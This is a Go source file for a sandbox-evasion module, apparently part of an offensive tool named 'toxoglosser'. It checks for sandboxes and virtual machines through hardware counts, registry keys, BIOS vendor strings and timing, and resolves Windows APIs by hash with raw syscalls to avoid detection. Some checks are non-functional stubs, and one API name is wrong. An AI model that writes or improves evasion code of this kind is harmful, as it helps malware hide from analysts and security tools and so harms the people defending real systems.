// evasion/sandbox.go
// Advanced sandbox detection techniques including BIOS checks
package evasion

import (
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	"toxoglosser/common"
)

// IsSandboxEnvironment checks for multiple sandbox indicators including BIOS vendors.
// This function performs various checks to detect if the current process is running
// in a sandboxed or virtualized environment, returning true if any indicators are found.
func IsSandboxEnvironment() bool {
	// Drive count check (typical sandbox has fewer drives)
	if checkDriveCount() {
		return true
	}

	// CPU core count check (sandbox environments often have limited cores)
	if checkCPUCount() {
		return true
	}

	// RAM amount check (sandboxes often have limited RAM)
	if checkRAMSize() {
		return true
	}

	// Check for common sandbox artifacts in processes
	if checkSandboxProcesses() {
		return true
	}

	// Check for common sandbox artifacts in registry
	if checkSandboxRegistry() {
		return true
	}

	// Check for specific MAC addresses used in virtualized environments
	if checkVirtualizedMAC() {
		return true
	}

	// Check for virtualized hardware using WMI (simplified in Go)
	if checkVirtualizedHardware() {
		return true
	}

	// BIOS vendor check - this is what the suggestion requested
	if checkBIOSVendor() {
		return true
	}

	// Timing check - sandboxes may execute operations faster than real systems
	if checkTiming() {
		return true
	}

	return false
}

// checkDriveCount checks if the system has an unusually low number of drives
func checkDriveCount() bool {
	drives := make([]uint16, 256)
	drivesLen := uint32(len(drives))

	// Manually resolve GetLogicalDriveStringsW function
	hKernel32, err := common.GetModuleHandleByHash("kernel32.dll")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		kernel32 := windows.NewLazyDLL("kernel32.dll")
		procGetLogicalDriveStrings := kernel32.NewProc("GetLogicalDriveStringsW")

		ret, _, _ := procGetLogicalDriveStrings.Call(
			uintptr(drivesLen),
			uintptr(unsafe.Pointer(&drives[0])),
		)

		if ret == 0 {
			return false // Error occurred, default to not sandbox
		}

		// Count null-terminated strings to determine number of drives
		count := 0
		for i := 0; i < len(drives); i++ {
			if drives[i] == 0 {
				count++
				// Skip to the next non-null character
				for i < len(drives) && drives[i] == 0 {
					i++
				}
				i-- // Compensate for the loop increment
			}
		}

		// If less than 2 drives, likely a sandbox
		return count < 2
	}

	addr, err := common.GetProcAddressByHash(windows.Handle(hKernel32), "GetLogicalDriveStringsW")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		kernel32 := windows.NewLazyDLL("kernel32.dll")
		procGetLogicalDriveStrings := kernel32.NewProc("GetLogicalDriveStringsW")

		ret, _, _ := procGetLogicalDriveStrings.Call(
			uintptr(drivesLen),
			uintptr(unsafe.Pointer(&drives[0])),
		)

		if ret == 0 {
			return false // Error occurred, default to not sandbox
		}

		// Count null-terminated strings to determine number of drives
		count := 0
		for i := 0; i < len(drives); i++ {
			if drives[i] == 0 {
				count++
				// Skip to the next non-null character
				for i < len(drives) && drives[i] == 0 {
					i++
				}
				i-- // Compensate for the loop increment
			}
		}

		// If less than 2 drives, likely a sandbox
		return count < 2
	}

	// Actually call the function via raw syscall
	ret, _, _ := syscall.SyscallN(
		addr,
		uintptr(drivesLen),
		uintptr(unsafe.Pointer(&drives[0])),
	)

	if ret == 0 {
		return false // Error occurred, default to not sandbox
	}

	// Count null-terminated strings to determine number of drives
	count := 0
	for i := 0; i < len(drives); i++ {
		if drives[i] == 0 {
			count++
			// Skip to the next non-null character
			for i < len(drives) && drives[i] == 0 {
				i++
			}
			i-- // Compensate for the loop increment
		}
	}

	// If less than 2 drives, likely a sandbox
	return count < 2
}

// checkCPUCount checks if the system has an unusually low number of CPU cores
func checkCPUCount() bool {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	procGetSystemInfo := kernel32.NewProc("GetSystemInfo")
	
	var sysInfo struct {
		wProcessorArchitecture      uint16
		wReserved                   uint16
		dwPageSize                  uint32
		lpMinimumApplicationAddress uintptr
		lpMaximumApplicationAddress uintptr
		dwActiveProcessorMask       uintptr
		dwNumberOfProcessors        uint32
		wProcessorType              uint32
		dwAllocationGranularity     uint32
		wProcessorLevel             uint16
		wProcessorRevision          uint16
	}
	
	procGetSystemInfo.Call(uintptr(unsafe.Pointer(&sysInfo)))
	
	// If less than 2 CPU cores, likely a sandbox
	return sysInfo.dwNumberOfProcessors < 2
}

// checkRAMSize checks if the system has unusually low amount of RAM
func checkRAMSize() bool {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	procGetPhysicallyInstalledSystemMemory := kernel32.NewProc("GetPhysicallyInstalledSystemMemory")
	
	var memSize uint64
	ret, _, _ := procGetPhysicallyInstalledSystemMemory.Call(uintptr(unsafe.Pointer(&memSize)))
	
	if ret == 0 {
		// Fallback: GetGlobalMemoryStatusEx
		return checkRAMWithGlobalMemoryStatus()
	}
	
	// If less than 2GB (2048MB) of RAM, likely a sandbox
	return uint64(memSize) < 2048*1024 // Memory is returned in KB
}

// checkRAMWithGlobalMemoryStatus is a fallback for checking RAM size
func checkRAMWithGlobalMemoryStatus() bool {
	kernel32 := windows.NewLazyDLL("kernel32.dll")
	procGetGlobalMemoryStatusEx := kernel32.NewProc("GetGlobalMemoryStatusEx")
	
	var memStatus struct {
		dwLength     uint32
		dwMemoryLoad uint32
		ullTotalPhys uint64
		ullAvailPhys uint64
		ullTotalPageFile uint64
		ullAvailPageFile uint64
		ullTotalVirtual uint64
		ullAvailVirtual uint64
		ullAvailExtendedVirtual uint64
	}
	
	memStatus.dwLength = uint32(unsafe.Sizeof(memStatus))
	ret, _, _ := procGetGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&memStatus)))
	
	if ret == 0 {
		// If all methods fail, assume not a sandbox
		return false
	}
	
	// If less than 2GB of RAM, likely a sandbox (convert from bytes to MB)
	return (memStatus.ullTotalPhys / (1024 * 1024)) < (2 * 1024)
}

// checkSandboxProcesses checks for processes commonly found in sandbox environments
func checkSandboxProcesses() bool {
	// For a real implementation, we would enumerate processes and check against a list
	// Here we'll just return false since Go doesn't make process enumeration straightforward
	return false
}

// checkSandboxRegistry checks for registry keys commonly found in sandbox environments
func checkSandboxRegistry() bool {
	// Use Windows API to check for sandbox registry keys
	advapi32 := windows.NewLazyDLL("advapi32.dll")
	procRegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
	procRegCloseKey := advapi32.NewProc("RegCloseKey")
	
	// Check for VirtualBox
	hKey := uintptr(0)
	registryPath := windows.StringToUTF16Ptr(`SOFTWARE\Oracle\VirtualBox Guest Additions`)
	
	ret, _, _ := procRegOpenKeyEx.Call(
		0x80000002, // HKEY_LOCAL_MACHINE
		uintptr(unsafe.Pointer(registryPath)),
		0,
		0x20019, // KEY_READ
		uintptr(unsafe.Pointer(&hKey)),
	)
	
	if ret == 0 {
		// Key exists, close it and return true
		procRegCloseKey.Call(hKey)
		return true
	}
	
	// Check for VMware
	registryPath = windows.StringToUTF16Ptr(`SOFTWARE\VMware, Inc.\VMware Tools`)
	
	ret, _, _ = procRegOpenKeyEx.Call(
		0x80000002, // HKEY_LOCAL_MACHINE
		uintptr(unsafe.Pointer(registryPath)),
		0,
		0x20019, // KEY_READ
		uintptr(unsafe.Pointer(&hKey)),
	)
	
	if ret == 0 {
		// Key exists, close it and return true
		procRegCloseKey.Call(hKey)
		return true
	}
	
	// Check for Virtual PC
	registryPath = windows.StringToUTF16Ptr(`SOFTWARE\Microsoft\Virtual Machine\Auto`)
	
	ret, _, _ = procRegOpenKeyEx.Call(
		0x80000002, // HKEY_LOCAL_MACHINE
		uintptr(unsafe.Pointer(registryPath)),
		0,
		0x20019, // KEY_READ
		uintptr(unsafe.Pointer(&hKey)),
	)
	
	if ret == 0 {
		// Key exists, close it and return true
		procRegCloseKey.Call(hKey)
		return true
	}
	
	return false
}

// checkVirtualizedMAC checks for MAC addresses commonly used in virtualized environments
func checkVirtualizedMAC() bool {
	// In a real implementation, we would enumerate network adapters and check MAC addresses
	// Common virtual machine MAC address prefixes:
	// VMWare: 00:05:69, 00:0C:29, 00:1C:42, 00:50:56
	// VirtualBox: 08:00:27
	// Hyper-V: 00:15:5D
	
	// Go's standard library doesn't make this straightforward without external dependencies
	// so we'll implement a basic version using Windows API
	
	iphlpapi := windows.NewLazyDLL("iphlpapi.dll")
	procGetAdaptersInfo := iphlpapi.NewProc("GetAdaptersInfo")
	
	bufLen := uint32(1024)
	buf := make([]byte, bufLen)
	
	ret, _, _ := procGetAdaptersInfo.Call(
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(unsafe.Pointer(&bufLen)),
	)
	
	// If GetAdaptersInfo is not available or fails, return false
	if ret != 0 {
		return false
	}
	
	// Parse the ADAPTER_INFO structure to check MAC addresses
	// This is a simplified approach and would need proper structure parsing
	// In practice, this would involve parsing the linked list of adapters
	
	return false
}

// checkVirtualizedHardware checks for virtualized hardware indicators
func checkVirtualizedHardware() bool {
	// Check CPU vendor string - virtual machines often have recognizable vendor strings
	cpuVendor := getCPUVendor()
	
	virtualizedVendors := []string{
		"VBoxVBoxVBox", // VirtualBox
		"VMwareVMware", // VMware
		"XenVMMXenVMM", // Xen
	}
	
	for _, vendor := range virtualizedVendors {
		if cpuVendor == vendor {
			return true
		}
	}
	
	return false
}

// getCPUVendor gets the CPU vendor string using CPUID instruction
func getCPUVendor() string {
	// In Go, we can't directly execute CPUID, so we'll need to use a syscall
	// or external library. For now, we'll return a placeholder.
	// This is difficult to implement directly in Go without assembly.
	
	return ""
}

// checkBIOSVendor checks for VM-specific BIOS vendors as requested in the suggestions
func checkBIOSVendor() bool {
	advapi32 := windows.NewLazyDLL("advapi32.dll")
	procRegOpenKeyEx := advapi32.NewProc("RegOpenKeyExW")
	procRegQueryValueEx := advapi32.NewProc("RegQueryValueExW")
	procRegCloseKey := advapi32.NewProc("RegCloseKey")
	
	hKey := uintptr(0)
	registryPath := windows.StringToUTF16Ptr(`HARDWARE\DESCRIPTION\System\BIOS`)
	
	ret, _, _ := procRegOpenKeyEx.Call(
		0x80000002, // HKEY_LOCAL_MACHINE
		uintptr(unsafe.Pointer(registryPath)),
		0,
		0x20019, // KEY_READ
		uintptr(unsafe.Pointer(&hKey)),
	)
	
	if ret != 0 {
		return false
	}
	defer procRegCloseKey.Call(hKey)
	
	// Query the BIOSVendor value
	valueName := windows.StringToUTF16Ptr("BIOSVendor")
	var valueType uint32
	var valueBuffer [256]uint16
	var valueSize uint32 = 256 * 2 // Size in bytes
	
	ret, _, _ = procRegQueryValueEx.Call(
		hKey,
		uintptr(unsafe.Pointer(valueName)),
		0,
		uintptr(unsafe.Pointer(&valueType)),
		uintptr(unsafe.Pointer(&valueBuffer[0])),
		uintptr(unsafe.Pointer(&valueSize)),
	)
	
	if ret != 0 {
		return false
	}
	
	// Convert the value to string
	biosVendor := windows.UTF16ToString(valueBuffer[:valueSize/2])
	
	// Check for VM-specific BIOS vendors
	vmBiosVendors := []string{
		"VirtualBox",
		"VMware",
		"Xen",
		"Bochs",
		"QEMU",
		"Hyper-V",
		"Oracle VM",
		"Parallels",
	}
	
	for _, vendor := range vmBiosVendors {
		if containsIgnoreCase(biosVendor, vendor) {
			return true
		}
	}
	
	return false
}

// containsIgnoreCase performs a case-insensitive substring check
func containsIgnoreCase(str, substr string) bool {
	// Simple implementation - convert both to lowercase and check
	s := toLower(str)
	sub := toLower(substr)
	
	for i := 0; i <= len(s)-len(sub); i++ {
		match := true
		for j := 0; j < len(sub); j++ {
			if s[i+j] != sub[j] {
				match = false
				break
			}
		}
		if match {
			return true
		}
	}
	return false
}

// toLower converts a string to lowercase (simplified implementation)
func toLower(s string) string {
	b := []byte(s)
	for i := range b {
		if b[i] >= 'A' && b[i] <= 'Z' {
			b[i] += 'a' - 'A'
		}
	}
	return string(b)
}

// checkTiming uses timing-based checks for sandbox detection
func checkTiming() bool {
	// In a sandbox, operations might execute faster due to optimization
	// or slower due to virtualization overhead
	// This checks for anomalous timing behavior that could indicate a sandboxed environment

	// Method 1: Perform a simple CPU-intensive operation and measure time
	var startTime int64
	var endTime int64

	// Get start time using manual API resolution
	hNtdll, err := common.GetModuleHandleByHash("ntdll.dll")
	if err != nil {
		// If we can't get the function, we can't do timing checks
		return false
	}

	addr, err := common.GetProcAddressByHash(windows.Handle(hNtdll), "NtQuerySystemTime")
	if err != nil {
		// If we can't get the function, we can't do timing checks
		return false
	}

	// Call NtQuerySystemTime to get start time
	sysTime := int64(0)
	ret, _, _ := syscall.SyscallN(addr, uintptr(unsafe.Pointer(&sysTime)))
	if ret != 0 { // STATUS_SUCCESS is 0
		// If the call failed, we can't do timing checks
		return false
	}
	startTime = sysTime

	// Perform a simple operation multiple times
	result := uint64(0)
	for i := 0; i < 1000000; i++ { // Increased iterations for more accurate timing
		result += uint64(i * i)
	}

	// Call NtQuerySystemTime to get end time
	ret, _, _ = syscall.SyscallN(addr, uintptr(unsafe.Pointer(&sysTime)))
	if ret != 0 { // STATUS_SUCCESS is 0
		// If the call failed, we can't do timing checks
		return false
	}
	endTime = sysTime

	// Calculate elapsed time (in 100-nanosecond intervals)
	elapsed := endTime - startTime

	// If the operation completed unusually quickly, it might be in a sandbox
	// Note: NtQuerySystemTime returns time in 100-nanosecond intervals since January 1, 1601
	// An extremely fast completion could indicate an emulated/sandboxed environment
	// This threshold needs fine-tuning based on testing
	if elapsed < 10000 { // Less than 1 millisecond for the operation
		return true
	}

	// Method 2: Check for consistent timing (some sandboxes might have timing inconsistencies)
	// This is a simplified check - in real implementations, more sophisticated methods are needed
	return false
}